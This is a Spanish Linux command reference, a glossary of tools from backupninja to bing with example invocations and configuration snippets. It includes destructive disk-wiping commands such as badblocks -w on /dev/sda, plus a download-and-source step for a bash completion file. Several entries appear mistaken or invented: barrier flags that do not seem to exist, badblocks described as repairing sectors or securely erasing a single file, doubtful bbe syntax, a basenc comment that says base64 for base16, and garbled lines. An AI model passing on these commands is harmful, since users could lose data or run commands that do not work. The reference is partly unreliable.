    reportemail = tuemail@ejemplo.com  # Recibe informes de las tareas
# backupninja --check (probar las configuraciones sin ejecutarlas)
# tail -f /var/log/backupninja.log (ver los registros)
Ejemplos para crear un respaldo de un directorio local. Las tareas individuales se almacenan en /etc/backup.d/. Cada archivo define una tarea específica en formato YAML:
1.-
# nano /etc/backup.d/10-backup-directorio.dup
Con las lineas:
    log: short
    action: rdiff
    source: /home/usuario/
    destination: /media/backup/
# backupninja --run (ejecutarlo)
2.-
Respaldo de una base de datos MySQL:
# nano /etc/backup.d/20-backup-mysql.sql
Con el contenido:
    log: short
    action: mysql
    database: midatabase
    username: root
    password: mipassword
    backupdir: /media/backup/mysql
    compress: gzip
# backupninja --run (ejecutarlo)
3.-
 Enviar copias de seguridad a un servidor remoto (rsync)
# nano  /etc/backup.d/30-backup-remoto.rsync
Con el contenido:
    log: verbose
    action: rsync
    source: /var/www/
    destination: usuario@servidorremoto:/backups/www/
    sshoptions: -i /home/usuario/.ssh/id_rsa
# backupninja --run (ejecutar la tarea)
4.-
 Respaldar un archivo completo del sistema (tar)
# nano /etc/backup.d/40-backup-sistema.tar
Con el contenido:
    log: verbose
    action: tar
    backupdir: /backups
    files:
      - /etc
      - /home
      - /var/log
    compress: gzip
# backupninja --run (ejecutarlo)
5.-
 Configurar tareas automáticas
Para que las tareas se ejecuten automáticamente, backupninja utiliza cron. Por defecto, está configurado en /etc/cron.d/backupninja para ejecutarse diariamente:
     0 3 * * * root backupninja --run
Esto ejecutará todas las tareas a las 3:00 AM.


backuppc
Sistema avanzado de copias de seguridad basado en disco que utiliza deduplicación y copias automáticas para gestionar respaldos de múltiples máquinas. Es ideal para redes locales y está diseñado para gestionarse con la interfaz de red que, normalmente se encuentra en http://localhost/backuppc
$ htpasswd /etc/backuppc/htpasswd backuppc (establecer la contraseña. El usuario es backuppc, que tambien puede cambiarse en el archivo /etc/backuppc/htpasswd)
$ systemctl start backuppc.service (arrancar el servicio)
$ firefox localhost/backuppc


badblocks
[e2fsprogs]. Utilidad para reparar sectores dañados del disco duro o pendrive. Trabajar con la unidad desmontada.
# badblocks -s -v -n -f /dev/sda  (recuperar y reparar sectores dañados)
# badblocks -nsv /dev/sda (Test de lectura y escritura no destructivo)
# badblocks -wsv /dev/sda (Test de lectura y escritura destructivo)
# badblocks -w -t random -s -v /dev/sda (Borrar un disco de forma segura)
# badblocks -s -w archivo.txt (Borrar de forma segura un archivo [irrecuperable])
# badblocks -sv /dev/sdb -o badblocks.log  (crear un informe)
nota.- Terminado el proceso debe formatearse la unidad, pasando a la herramienta los bloques dañados:
# mkfs.vfat -l badblocks.log -n usb /dev/sdb  (-n es un nombre que le damos a la unidad)
Opciones
	-s (muestra el progreso)
	-v (modo detallado)
	-n (recupera sectores dañados sin destruir informacion [modo no-destructivo])
	-f (repara los sectores dañados)
	-w (Modo destructivo)
	-t random (escribe de forma aleatoria en el disco)


balloon
Proporciona una implementación eficiente y segura de hashes de contraseñas basada en Go.
$ balloon -passwd "linuxgenial"
      Salt: 206ce7b0cfd53074
      Hash: a8e81862d75f9281db061c08984e11f45fe5925d0ce3719ac7a6bad5be661c6a87e4c4648d3ad337a084441ae64d3b13690c589621c5ea9fcb9a392381397f4f
      Encoded: $balloon$h=sha512,s=65536,t=3,p=1$IGznsM/VMHQ$qOgYYtdfkoHbBhwImE4R9F/lkl0M43Gax6a61b5mHGqH5MRkjTrTN6CERBrmTTsTaQxYliHF6p/LmjkjgTl/Tw
$ balloon -salt 206ce7b0cfd53074
      Salt: 206ce7b0cfd53074
      Hash: 79d5a9453d93693dc3d076f79dd2dc194f0922a836f665e8f2d4ca9f4487d71dd3374698c09fe064987157d79f3ff61a9b7838bf2d5b13a6b00265900f9ca6dc
      Encoded: $balloon$h=sha512,s=65536,t=3,p=1$IGznsM/VMHQ$edWpRT2TaT3D0Hb3ndLcGU8JIqg29mXo8tTKn0SH1x3TN0aYwJ/gZJhxV9efP/Yam3g4vy1bE6awAmWQD5ym3


bandwidthd
Herramienta que analiza la utilización del ancho de banda disponible y genera reportes gráficos. Una vez instalado poner en la barra del navegador:
	file:///var/lib/bandwidthd/htdocs/index.html
Para afinar la configuración en /etc/bandwidthd/bandwidthd.conf


banner
Muestra un cartel en pantalla
$ banner Linux
$ banner -C linux  (centra la imagen en la linea)
$ banner -l linux   (forma cada letra con la misma letra diminuta)
$ banner -Cck linux  (centrado y con la letra “k” formando la palabra “linux”)


bar
Mostrar barra de progreso de un proceso.
$ bar file1 file2 file2 > file3 (equivalente a: cat file1 file2 file2 > file3)
$ bar -o outfile infile (equivalente a: cp infile outfile)
$ bar -n archivo.tar.gz | tar -xzpf - (de la descompresión de un archivo)


barrier
Permite compartir fácilmente un único ratón y teclado entre varios ordenadores con distintos sistemas operativos, cada uno con su propia pantalla, sin necesidad de hardware especial. Está pensado para usuarios con varios ordenadores en su escritorio, ya que cada sistema utiliza su propia pantalla. Redireccionar el ratón y el teclado es tan sencillo como mover el ratón fuera del borde de la pantalla. Barrier también fusiona los portapapeles de todos los sistemas en uno solo, lo que permite cortar y pegar entre sistemas. Además, sincroniza los protectores de pantalla para que todos se inicien y finalicen juntos y, si el bloqueo de pantalla está habilitado, solo una pantalla requiere una contraseña para desbloquearlos todos.
$ barrier --master=pc1 --slave=pc2 (compartir una única pantalla y entrada entre dos computadoras, PC1 como el maestro y PC2 como el esclavo)
$ barrier --master=pc1 --slave=pc2 pc3 pc4 (conecta PC1 como maestro con PC2, PC3 y PC4 como esclavos)
$ barrier --master=pc1 --slave=pc2 --shared-key=KEY (especifica un clave compartida para asegurar la conexión entre los nodos barrier)
$ barrier --status (muestra el estado actual de todas las conexiones barrier activas)
$ barrier --stop (detiene completamente la sesión barrier en ejecución)


base58
Herramienta útil para codificar y decodificar datos en formato Base58.
$ echo "linuxgenial" | base58 (codificar)
$ echo "33f9yRbkMB4uknG9f" | base58 --decode (descodificar)


base64
[cl-base64]. Codificador/descodificador de textos
$ cat archivo| base64 > cifrado (cifrar "archivo" y volcarlo en "cifrado")
$ base64 archivo.txt  (codifica todo el texto de archivo.txt)
$ base64 -d codificado.txt (descodificar)
$ echo "la_contraseña_secreta" | base64 > archivo.txt (Codificar palabra o frase)


base-files
Este paquete contiene la jerarquía básica del sistema de archivos de un sistema Debian y varios archivos importantes, como /etc/debian_version, /etc/host.conf, /etc/issue, /etc/motd, /etc/profile, y otros, y el texto de varias licencias comunes en uso en sistemas Debian.


basename
Mostrar el archivo “pelado” suprimiendo su ruta y sufijos.
$ basename /etc/rc.d/cupsd (devolverá “cupsd”)
$ basename /etc/rc.d/cupsd start (También devolvera “cupsd”)


basenc
Codificar/decodificar datos e imprimirlos por pantalla.
$ basenc --base16 text.txt > cifrado.txt (cifrar con base64)
$ cat cifrado.txt | basenc -d --base16 (descifrar)
$ printf 'linux es un sistema genial' | basenc --base64 (cifrar)


basez
Codificar/descodificar archivos. Incluye los ejecutables: hex, base16, base32plain, base32hex, base64plain, base64url, base64mime y base64pem. Todos los ejecutables se usan con los mismos argumentos:
$ basez -i archivo.txt -o salida.txt (mandar la codificación a salida.txt)
$ basez -d salida.txt (lo muestra en pantalla descodificado)
$ base64url archivo.txt (muestra la codificación en pantalla)


bash
Intérprete de comandos compatible con sh que ejecuta comandos leídos desde la entrada estándar o desde un archivo.
$ bash -n script (comprueba todo un script sin ejecutar comandos solo los comprueba)
$ bash -v script (Imprime las líneas de entrada del shell a medida que se leen)
$ bash -x script (Imprime los comandos y sus argumentos a medida que se ejecutan)
1.-
Encabezar un script de bash con la linea
          #!/bin/bash
Si queremos que el script bash se ejecute en modo "depuración"
          #!/bin/bash -x
2.-
Los parámetros que se pueden usar dentro de un script bash son:
    $# 	Nº de parametros recibidos
    $0 	Nombre y ruta del propio script
    $1 ... $9 	Parámetros del 1 al 9 recibidos
    ${N} 	Parámetro de la posicion N recibido
    $* 	Todos los parámetros recibidos [excepto $0]
    $@ 	Array de parámetros recibidos [excepto $0]
    $$ 	El PID [numero de proceso] del script
    $? 	El código de error del ultimo comando ejecutado


bash-argsparse
reemplazar las funciones de análisis de opciones y descripción de uso que se suelen reescribir en todos los scripts. El listado puede verse con el navegador: file:///usr/share/doc/bash-argsparse/html. Para usar o adaptar alguna función, en el script que estamos realizando ha de incluirse la lineaa:
           source /usr/share/bash-argsparse/argsparse.sh


bash-builtins
Bash puede cargar dinámicamente nuevos comandos integrados. Se incluyen los encabezados necesarios para compilar sus propios comandos integrados y muchos ejemplos. En el navegador file:///usr/share/doc/bash-builtins


bash-doc
Manuales de bash (en).
$ firefox file:////usr/share/doc/bash/bashref.html
$ evince /usr/share/doc/bash-doc/bash.pdf
$ evince /usr/share/doc/bash/bash.pdf
$ ls /usr/share/doc/bash/examples


bash_it
Gran número de alias, complementos y temas que darán un nuevo aspecto a la shell
$ git clone --depth=1 https://github.com/Bash-it/bash-it.git ~/.bash_it (descargar en ~/.bash_it)
$ cd ~/.bash_it (entrar en el directorio)
$ ./install.sh (instalar y colocar en ~/.bashrc la configuración del paquete)
$ ls ~/.bash_it/themes/ (escoger el tema)
Una vez escogido el tema, modificar en ~/.bashrc la linea:
        export BASH_IT_THEME="brunton"
$ bash-it reload (recargar la modificación del archivo de configuración)
$ bash-it show aliases (listar el listado de alias activados o desactivados)
$ bash-it enable aliases apt (activar el alias apt)
$ bash-it help alias apt (ver todos los alias de apt)
$ bash-it enable alias all (activar todos los alias del listado)
$ bash-it disable alias apt (desactivar el alias de apt)
$ bash-it disable alias all (desactivar todos los alias del listado)
$ bash-it show plugins (listado de plugins)
$ bash-it enable plugin tmux (activar el plugin tmux)
$ bash-it help plugin tmux
$ bash-it show completions (listado de autocompletados)
Para no lanzar bash-it reload cada vez que se modifica algo de la configuración y se recargue automaticamente, descomentar en ~/.bashrc la linea:
        export BASH_IT_AUTOMATIC_RELOAD_AFTER_CONFIG_CHANGE=1
$ bash-it enable completion pipx (activar el autocompletado de pipx)
$ bash-it disable completion pipx (desactivar)
$ bash-it enable completion all (activar todos los autocompletados)
$ bash-it doctor errors (muestra errores de la aplicación)
$ bash-it doctor warnings (muestra warnings de la aplicación)
$ bash-it update stable (actualizar la aplicación stable)
$ bash-it migrate (migrará automáticamente la estructura de Bash-it a la versión más reciente)
El comando "migrate" se ejecuta automáticamente al ejecutar los comandos "update", "enable" y "disable"
$ bash-it search ruby rake gem bundle irb rails (buscar qué complementos, alias o completaciones están disponibles para un framework, lenguaje de programación o entorno específico, relacionados con comandos que se usan con frecuencia)
$ bash-it restart (reiniciar el shell)
$ bash-it profile list (ver todos los perfiles disponibles)
$ bash-it profile save mi_perfil (guardar la configuración actual en un perfil llamado mi_perfil)
$ bash-it profile load mi_perfil (cargar el perfil llamado mi_perfil)
$ bash-it profile rm mi_perfil (eliminar el perfil mi_perfil)


bashbug
Guión del shell para ayudar al usuario a componer y enviar informes de fallos concernientes a bash en un formato normalizado. bashbug llama al editor por defecto o, si no está definido a emacs. El usuario debe rellenar los campos apropiados y salir del editor. Entonces, bashbug envía el informe a bug-bash@prep.ai.mit.edu. Si el informe no puede ser enviado, se guarda en el fichero dead.bashbug en el directorio del usuario. La plantilla del informe consiste en varias secciones. La primera proporciona información sobre la máquina, el sistema operativo, la versión de bash y el entorno de compilación. La segunda sección debería rellenarse con una descripción del fallo. La tercera sección debería ser una descripción de cómo reproducir el fallo y la cuarta sección, opcional, es para una correción que se proponga.
$ bashbug


bashburn
Grabador de CDs en bash. Una vez lanzada la aplicación y creado el archivo de configuración, sale un bonito menú de opciones del que se desplegaran nuevos submenús según la selección.
$ bashburn


bashdb
Debbuger para bash scripting.
$ bashdb ./script.sh
Entra en el prompt de la aplicación.
	help (Muestra las opciones)
	next (ejecuta la siguiente orden)


bashish
Entorno para terminales de texto. Permite cambiar colores, tipo de letra, transparencias, imagen de fondo... Descarga de <http://sourceforge.net/projects/bashish/files/> . Se instala con el clásico:
$ ./configure && make && sudo make install
$ bashish list (Muestra el listado de temas)
$ bashish fire (Abre la terminal col el tema fire)
$ BASHISH_DISABLED=1 un_comando (Lanza el comando que especifiquemos deshabilitando bashish)


bashrc
Archivo de configuración de la terminal propia del usuario.
1.-
Para que al escribir un comando que requiera permisos de root pueda autocompletarse presionando la tecla “Tab”.
$ gedit /home/usuario/.bashrc
Y añadir las líneas:
	if [ "$PS1" ]; then
	    Complete -cf sudo
	fi
2.-
Añadiendo o modificando las siguientes lineas se consigue que el history de bash se amplie al recuerdo a los últimos 3000 comandos usados, suprimiendo los repetidos y que ignore el espacio (Si se pone) de delante de un comando.
	export HISTFILESIZE=3000
	export HISTCONTROL=ignoredups:ignorespace
Si queremos que la sesión de bash se cierre si está inactiva durante 600 segundos, colocar la linea:
	export TMOUT=600
3.-
Establecer un proxy global a nuestro sistema
$ nano ~/.bashrc
Y añadir las siguientes líneas:
	export http_proxy=”http://ip_del_servidor:puerto”
	export https_proxy=”http://ip_del_servidor:puerto”
	export ftp_proxy=”http://ip_del_servidor:puerto”
4.-
Para que el history indique fecha y hora en la que se ha lanzado el comando:
	export HISTTIMEFORMAT='- %F %T - '
5.-
Para guardar en /root un fichero de histórico por cada uno de los usuarios que se hayan pasado a root.
	export HISTFILE=/root/.bash_hist-$(who am i | awk '{print $1}';exit)


bashtop
Script de bash que muestra información sobre el uso de la cpu, espacio de disco y procesos del sistema. Descarga <https://github.com/aristocratos/bashtop>
$ bashtop


bastet
Clon libre de Tetris que intenta calcular qué tan útiles son los bloques que necesitas y te da el peor posible.
$ bastet


batcat
Reemplazo de cat con resaltado de sintaxis para una gran cantidad de idiomas, integración con git y paginación automática. En este paquete, el ejecutable y su página de manual han cambiado de nombre de "bat" a "batcat" debido a un conflicto de nombres de archivo con otro paquete Debian.
$ batcat -A text.txt (mostrando, espacios, tabulaciones, nueva linea...)
$ batcat -p text.txt (mostrar en texto plano)
$ batcat -n script.sh (mostrando número de lina)
$ batcat -l c script.c (batcat detectará muchos lenguajes de programación resaltarando la sintaxis. La opción -l fuerza la detección de un lenguaje concreto, como C)
$ batcat -L (todos los lenguajes soportados)
$ batcat --list-themes (ver temas con sus muestras disponibles)
$ batcat --theme TwoDark archivo (ver archivo con el tema seleccionado)
Si queremos usar un tema concreto por defecto, colocar en .bashrc la linea y recargar:
   export BAT_THEME="DarkNeon"
   $ source ~/.bashrc


batctl
Herramienta para interactuar con B.A.T.M.A.N [Better Approach To mobile Ad-hoc Networking) protocolo que permite crear redes de malla dinámicas y distribuidas. Antes de usar batctl, se ha de configurar una interfaz de red como parte de la malla:
            # ip link set wlan0 down
            # iwconfig wlan0 mode ad-hoc
            # iwconfig wlan0 essid batman-mesh
            # ip link set wlan0 up
            # batctl if add wlan0
            # ip link set up dev bat0
Nota.- wlan0: interfaz de red configurada en modo ad-hoc y bat0: interfaz virtual que representa la red B.A.T.M.A.N.
# batctl if add eth0 (asocia la interfaz eth0 a la red de malla gestionada por batman-adv)
# batctl if (muestra las interfaces asociadas a batman-adv)
# batctl o (muestra los vecinos y rutas aprendidas dentro de la red de malla)
# batctl ping 02:12:34:56:78:90 (hacer un ping a través de la malla)
# batctl td bat0 (inicia la captura de paquetes en la interfaz bat0)
# batctl n (muestra los nodos vecinos y su calidad de enlace)
# batctl ap 1 (habilitar el modo puente)
# batctl ap 0 (deshabilitar el modo puente)
# batctl gw_mode server 20 (configura el nodo como un gateway con un TTL de 20)
# batctl loglevel 2 (activa un nivel más detallado de registro para depuración)
# batctl tp 02:12:34:56:78:90 (ver estadísticas de origen de paquetes y el rendimiento entre nodos)
# modprobe batman-adv (asegúrar de que el módulo del kernel esté cargado)


bats
Este comando [Bash Automated Testing System] es un marco de pruebas para Bash que permite escribir scripts y generar salidas compatibles con TAP [Test Anything Protocol] para verificar que se comporten como se espera. Bats es más útil cuando se prueba software escrito en Bash, pero puede usarse para probar cualquier programa UNIX.
$ bats script.sh
$ bats -t script.sh (prubea detallada)


bb
demostración audiovisual de arte ascii


bb.sh
Servidor web integramente en bash. Descarga: <https://github.com/cfenollosa/bashblog>. Una vez copiado el script en la carpeta web, normalmente en /var/www o /var/www/html y otorgarle permisos de ejecución [chmod +x bb.sh] y, preferiblemente a partir de archivos markdown, lanzar:
$ ./bb.sh post archivo.md (crear un post en html a partir de un archivo markdown)
$ ./bb.sh edit -f archivo.html (Editar un archivo ya realizado para modificarlo)
$ ./bb.sh rebuild (Actualizar después de una modificación)
$ ./bb.sh list (Listar todos los post)
$ ./bb.sh delete archivo.md (Eliminar archivo)
$ ./bb.sh reset (resetear el site. No elimina los archivos md creados solo lo generado por el script)
Nota.- Caso de tener el blog en el directorio personal, crear enlace simbolico a la carpeta web (ln -s /home/USER/blog /var/wwww/html/)


bbcode
Colección de etiquetas que se usan para cambiar la apariencia del texto en un blog (similar al lenguaje de marcas html). Su forma de uso es [etiqueta-1][etiqueta-2] texto [/etiqueta-1][/etiqueta-2]
	[b]texto[/b] (Negrita)
	[u]texto[/u] (Subrayado)
	[i]texto[/i] (cursiva)
	[color=red]texto[/color] (texto en color rojo. Otros colores: brown, marron, orange, yellow, lime, green, aqua, blue, navy, purple, fuchsia, silver, white, coral...)
	[font="Arial Narrow"]texto[/font] (Emplear la fuente Arial. Otras fuentes: Century, Currier New, Fixed Sys, Georgia, Lucida, Times New Roman, Verdana.. Si se emplean fuentes "exóticas" y el que visiona el texto no la tiene instalada, la etiqueta se pasará por alto. Tambien es mejor entrecomillar el nombre de la fuente i esta contine espacios)
	[url=http://lapipaplena.net]La Pipa Plena[/url] (Enlace a una web)
	[url]http://lapipaplena.net[/url]
	[email]juan@gmail.com[/email] (Enlace a un correo)
	[email=juan@gmail.com]Correo de juan[/email]
	[img]/home/usuario/imagenes/lago.png[/img] (Mostrar una imagen)
	[quote="Frase popular"]A quien madruga Dios le ayuda[/quote] (Cita)
	[quote]A quien madruga Dios le ayuda[/quote] (Cita sin mostrar autor)
	[code]texto[/code] (citar código fuente)


bbe
Editor [Binary Block Editor] como sed, pero para archivos binarios lo que permite realizar modificaciones, inserciones, y reemplazos en bloques de datos.
$ bbe -e 'i 0xABCD' < entrada.bin > salida.bin (inserta los bytes AB CD al inicio del archivo de entrada y lo guasrda en salida.bin
$ bbe -e 's 0x1234 0x5678' < entrada.bin > salida.bin (reemplaza todas las ocurrencias del patrón 12 34 por 56 78)
$ bbe -e 'd 0 10' < entrada.bin > salida.bin (elimina 10 bytes desde el inicio)
$ bbe -e 'c 0xFF 5' < entrada.bin > salida.bin (cambia el byte en la posición 5 por FF)
$ bbe -e 's 0xDEAD 0xBEEF' < entrada.bin | hexdump -C (muestra el archivo modificado en formato hexadecimal.)
$ bbe -e 'p 0xCAFEBABE' < entrada.bin > salida.bin (añade los bytes CA FE BA BE al inicio)
$ bbe -e 'a 0x12345678' < entrada.bin > salida.bin (añade los bytes 12 34 56 78 al final)
$ bbe -e 'c 0xFF 0; c 0xAA 10' < entrada.bin > salida.bin (cambia el byte en la posición 0 a FF y el byte en la posición 10 a AA)
$ bbe -e 'r 0x00 5 10' < entrada.bin > salida.bin (Rellena los 10 bytes comenzando desde la posición 5 con 00)
$ bbe -e 'x 0 5 20' < entrada.bin > salida.bin (copia los 5 primeros bytes al desplazamiento 20)
$ echo "Datos adicionales" | bbe -e 'p 0xCAFEBABE' > salida.bin (modificar un archivo desde stdin)
$ bbe -e 's 0x1111 0x2222' < entrada.bin > temp.bin && mv temp.bin entrada.bin (modificar un archivo directamente y sobrescribirlo)


bbpager
Herramienta que coloca un aplet para intercambiar el area de trabajo. Configuración en el archivo /.bbtools/bbpager.rc


bbrun
Lanzador de aplicaciones propio de fluxbox.


bc
Calculadora
$ bc -l  (Entra en el promt de la calculadora. Para terminar teclear quit o exit)
$ echo "36*2" | bc
$ echo "(1409302/28186042)*100" | bc -l
$ echo "scale = 6; 13.397/12" | bc (Resultado con 6 decimales)


bcache-tools
Herramienta que permite utilizar unidades SSD como caché para dispositivos de almacenamiento más lentos, como discos duros [HDD], mejorando el rendimiento del sistema.
# make-bcache -C /dev/sdX (formatea el SSD como caché [verificar la unidad SDD con: fdisk -l])
# make-bcache -B /dev/sdY (formatea el dispositivo HDD que será almacenado en caché)
  $ ls /sys/fs/bcache (identifica los UUIDs generados al crear el caché y el backend)
  $ echo <cache-UUID> | sudo tee /sys/block/bcache0/bcache/attach (conectar el caché al backend)
# echo writethrough | sudo tee /sys/block/bcache0/bcache/cache_mode (escribe en caché y backend simultáneamente.)
Nota.- Otras opciones: Writeback: Escribe primero en caché, luego en el backend y Writearound: Escribe directamente en el backend.
# mount /dev/bcache0 /mnt (montar el dispositivo bcache)
# bcache-super-show /dev/sdX (comprobar rendimiento o estadísticas del caché)
# echo 1 | sudo tee /sys/block/bcache0/bcache/detach (desconectar un dispositivo de caché)
# ls /sys/fs/bcache/ (listar dispositivos gestionados por bcache)
# echo 1 | tee /sys/block/bcache0/bcache/stop (detener el caché)
# wipefs -a /dev/sdX (borrar el superblock)
$ make-bcache --help (explorar más comandos y opciones)
$ bcache-super-show --help (explorar más comandos y opciones)


bcal
Herramienta utilizada para realizar cálculos relacionados con bits, bytes y direcciones.
$ bcal 1024 b (convertirá 1024 bytes a otras unidades de almacenamiento, mostrando el resultado en kilobytes, megabytes, etc.)
$ bacl 1024 giH


bcd
Formatea un texto en forma de tarjeta perforada.
$ bcd linux es genial


bcftools
Conjunto de utilidades que manipulan las llamadas de variantes en Variant Call Format [VCF] y su contraparte binaria BCF.
$ bcftools view -r ch1:100000-200000 input.vcf.gz > output.vcf (extrae las variantes en la región del cromosoma 1 entre las posiciones 100000 y 200000)
$ bcftools view -i "QUAL > 30 && DP > 10" input.vcf.gz > output.vcf (filtra las variantes con calidad superior a 30 y profundidad de mapeo mayr a 10)
$ bcftools query -f '%POS\n' input.vcf.gz | wc -l (extrae solo las posiciones y cuenta el número de líneas, lo que equivale al número de variantes)
$ bcftools query -f '%INFO/AF\n' input.vcf.gz > af_info.txt (extrae la frecuencia alélica [AF] de los campos INFO y la guarda en un archivo separado
$ bcftools view -a 'T' input.vcf.gz > output.vcf (filtra las variantes donde el alelo alternativo es 'T')
$ bcftools view -i "(DP > 50 || QUAL > 40) && (AF > 0.05)" input.vcf.gz > output.vcf (filtra variantes con profundidad de mapeo superir a 50 o calidad superior a 40, y frecuencia alélica mayor a 0.05)


bd
Sustituye los clásicos cd ../../.. para ir varios directorios atras en la misma ruta por una forma más simple y solo colocando las primeras letras del directorio al que queremos ir..
$ cd /Documentos/linux/emacs/org/presentaciones/css
@Deb:~/Documentos/linux/emacs/org/presentaciones/css > bd e
@Deb:~/Documentos/linux/emacs/ > bd D
@Deb:~/Documentos/ >
Nota.- Precisa algunos ajustes en configuración del sistema:
$ echo 'alias bd=". bd -si"' >> ~/.bashrc
$ source .bashrc
# wget -O /etc/bash_completion.d/bd https://raw.github.com/vigneshwaranr/bd/master/bash_completion.d/bd
# source /etc/bash_completion.d/bd


bchunk
Convierte una imagen de CD en formato .bin/.cue o, a veces .raw/.cue en un conjunto de pistas .iso y .cdr/.wav. El formato .bin/.cue lo utilizan algunos programas de escritura de CD que no son UNIX, pero no es compatible con la mayoría de los demás programas de escritura de CD.
$ bchunk -v imagen.bin imagen.cue salida (creará un archivo iso llamado "salida.iso" con los datos del disco y modo verbose)
$ bchunk -w imagen.bin imagen.cue salida (con el audio en formato WAV


beep
Pitidos del altavoz
# beep
# beep -f 440 -l 1000 (Sonando un La durante 1000 milisegundos)
# beep -r 5 -d 1000 (5 pitidos separados entre ellos por 1000 milisegundos de silencio)
# beep -f 1000 -n -f 2000 -n -f 1500 ("-n" permite introducir nuevos parámetros)
# cat /etc/apt/sources.list | beep -c -f 311 -D 50 -l 10  (Emitirá un pitido despues de cada caracter[-c])
Notas:
Frecuencias de la escala musical (-f):
	Do > 261
	Do# > 277
	Re > 293
	Re# > 311
	Mi > 329
	Fa > 349
	Fa# > 369
	Sol > 392
	Sol# > 415
	La > 440
	La# > 466
	Si > 493
Si beep no emite sonidos, puede que el dispositivo esté en la lista negra:
# nano /etc/modprobe.d/blacklist (Comprobar si existen alguna linea: blacklist pcspkr o  blacklist snd_pcsp)
# lsmod | grep pcsp  (Otra forma de comprobar si existe como módulo)
# modprobe pcspkr  (para cargarlo)
# modprobe -r pcspkr  (Para eliminarlo nuevamente)
# rmmod pcspkr  (Otra forma de quitar el módulo)


bfbtester
Realizar comprobaciones de seguridad rápidas y proactivas de programas binarios. BFBTester realizará comprobaciones de desbordamientos de línea y múltiples, así como desbordamientos de variables de entorno. También puede observar la actividad de creación de archivos temporales para alertar al usuario sobre cualquier programa que utilice nombres de archivos temporales no seguros. Si bien no puede probar todos los desbordamientos en el software, es útil para detectar errores iniciales que pueden alertar sobre software peligroso.
$ bfbtester -a /home/user/bin/* (todas las comprobaciones de los scripts del directorio mencionado en el home del usuario)


bfs
[Breadth-First Search]. Es una variante del comando find de UNIX, pero con un enfoque de búsqueda en anchura [Breadth-First Search] en lugar de en profundidad [Depth-First Search]. Esto significa que bfs explora primero todos los archivos y directorios del nivel actual antes de descender a los subdirectorios.
$ bfs -name "*.txt" (busca todos los archivos .txt en el directorio actual y subdirectorios)
$ bfs -type f -name "*.log" (busca solo archivos, no directorios con extensión .log)
$ bfs -name "*.py" -exec chmod +x {} \; (busca todos los archivos .py y les da permiso de ejecución)
$ bfs -maxdepth 2 -name "*.conf" (busca archivos .conf solo hasta 2 niveles de profundidad)
$ bfs -size +10M (busca archivos mayores a 10MB)
$ bfs -name "*.sh" -print (muestra solo la ruta de los archivos .sh encontrados)


bg
Pasa un proceso a segundo plano.
$ bg PID
$ bg %3 (mover el proceso 3 a background)


biew
[beye]. Comando ncurses para ver y editar ficheros en modo assembler, binario, hexadecimal o modo texto. Es capaz de abrir cualquier archivo, ya sea un fichero de texto o un binario.
$ biew archivo
Para seleccionar el modo de visualización hay que pulsar la tecla F2.
Para realizar búsquedas hay que pulsar la tecla F7
Con la tecla F5 podemos ir a una linea en concreto o si cambiamos el modo, podemos indicar el % al que queremos ir (esto es especialmente útil si deseamos ir al principio o al final del fichero si este es enorme)


big-cursor
Proporciona cursores de mouse grandes para usar en X. Es útil para usuarios de computadoras portátiles, para aquellos que ejecutan X en resoluciones muy altas y para cualquiera a quien le resulte difícil ver los cursores predeterminados del mouse.


bin2iso
Convierte una imagen bin/cue a iso
$ bin2iso imagen.cue  imagen.iso


binclock
Reloj en formato binario para la consola.
$ binclock
$ binclock -l -t (En formato tradicional [hora, minuto, segundo] y actualizando cada segundo)
$ binclock -l -n (Añadiendo la hora en formato humano)


bind
Para probar combinaciones de teclas que no queremos almacenar de forma permanente en el archivo .inputrc (ver)
$ bind "\"\C-x\C-g\": dump-functions" (asignará las teclas Ctrl+x Ctrl+g para ver las funciones readline)
$ bind -P (listado de asignación de teclas de cada función readline)
$ bind -l (Otra forma de ver el listado)
$ bind -p (Otra forma)
$ bind -x "\"\C-l\": ls -la" (asignar combinaciones de teclas que ejecutan comandos. ls -la al pulsar Ctrl+l)


bindechexascii
Comvertir el número entrado como argumento a distintos formatos y viceversa [binario a decimal, binario a hexadecimal, binario a ASCII, decimal a binario...]
$ bindechexascii --d2b 2020 (convierte el num indicado a binario)
$ bindechexascii --d2h 2020 (lo convierte a hexadecimal)
$ bindechexascii --b2d 11111100100 (convierte el num binario a decimal)


bindfs
Herramienta basada en FUSE que permite montar un directorio en otro con opciones específicas, como cambiar permisos, usuarios, grupos o comportamientos del sistema de archivos. Es muy útil para gestionar permisos sin alterar los originales o para configurar accesos específicos.
$ bindfs ~/Documentos /mnt/docs (montar un directorio en otro)
$ bindfs --owner=USER ~/Documentos /mnt/docs (cambia el propietario de los archivos en el punto de montaje. Esto no afecta los archivos originales, solo los reflejados)
$ bindfs --group=grupo ~/Documentos /mnt/docs (simular que los archivos pertenecen a un grupo específico como el caso anterior)
$ bindfs --perms=a-w ~/Documentos /mnt/docs (montar un directorio como solo lectura)
$ bindfs --perms=644 ~/Documentos /mnt/docs (cambiar los permisos reflejados)
$ bindfs --uid=1000 --gid=1000 ~/Documentos /mnt/docs (simular que los archivos tienen un usuario y grupo específicos)
$ bindfs --force-user=otro_usuario ~/Documentos /mnt/docs (que todos los accesos sean tratados como si vinieran de otro_usuario)
$ bindfs --create-with-perms=775 --create-with-group=grupo ~/Documentos /mnt/docs (que los nuevos archivos tengan permisos 775 y pertenezcan al grupo grupo)
$ bindfs --hide-files='*.log' ~/Documentos /mnt/docs (montar un directorio y ocultar archivos .log)
$ bindfs --force-group=grupo --mirror-only=usuario1,usuario2 ~/Documentos /mnt/docs (limitar accesos a los reflejados solo a ciertos usuarios del grupo)
$ fusermount -u /mnt/docs (desmontar el sistema de archivos)
$ mount | grep bindfs (verificar información sobre el montaje)
1.- Para montar un directorio automáticamente al iniciar:
# nano /etc/fstab
Y añadir la linea:
  bindfs#/home/USER/Documentos /mnt/docs fuse defaults 0 0
Con esta linea tambien puede montarse con:
# mount /mnt/docs


bing
Herramienta de medición de ancho de banda entre dos puntos en una red utilizando el comportamiento de paquetes ICMP, similar a ping. Bing determina el rendimiento real, en bruto, en contraposición al disponible o promedio en un enlace midiendo los tiempos de ida y vuelta de las solicitudes de eco ICMP para diferentes tamaños de paquetes en cada extremo del enlace. Puede no ser completamente preciso debido a la latencia de red y el tráfico concurrente.
# bing host1 host2 (envía paquetes de diferentes tamaños entre los dos hosts y estima el ancho de banda)
# bing -s 56 host1 host2 (con un tamaño inicial de 56 bytes para los paquetes ICMP)
# bing -c 20 host1 host2 (realiza 20 pruebas por tamaño. Por defecto 10)
# bing -v host1 host2 (proporciona más detalles sobre cada paquete y cálculo)
# bing -4 host1 host2 (especificar la versión de IP que se debe usar, -6 para IPv6)
